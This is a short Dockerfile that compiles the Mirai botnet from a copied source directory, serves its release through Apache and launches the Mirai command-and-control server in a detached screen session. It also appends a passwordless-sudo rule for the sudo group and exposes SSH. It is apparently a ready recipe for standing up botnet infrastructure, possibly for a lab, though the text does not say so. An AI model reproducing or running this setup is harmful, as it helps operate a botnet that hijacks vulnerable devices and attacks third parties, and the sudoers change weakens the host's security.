FROM ubuntu:20.04

# Configuracion de zona horaria para evitar errores al instalar paquetes
ENV TZ=Europe/Madrid
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone


RUN apt update && apt install openssh-server git sudo -y

COPY /mirai /mirai
RUN apt install gcc golang electric-fence screen dialog python3 apache2 telnet -y
WORKDIR "/mirai"

RUN sudo bash ./tools/compilers.sh
RUN bash -c "source ${HOME}/.bashrc"
RUN bash ./setup.sh
RUN bash ./build.sh debug telnet

RUN python3 setup.py
RUN cd release && bash ../apache2.sh
RUN cd release && screen -dmS mirai-cnc ./cnc
RUN service ssh start
RUN echo '%sudo ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

EXPOSE 22
CMD ["/usr/sbin/sshd","-D"]

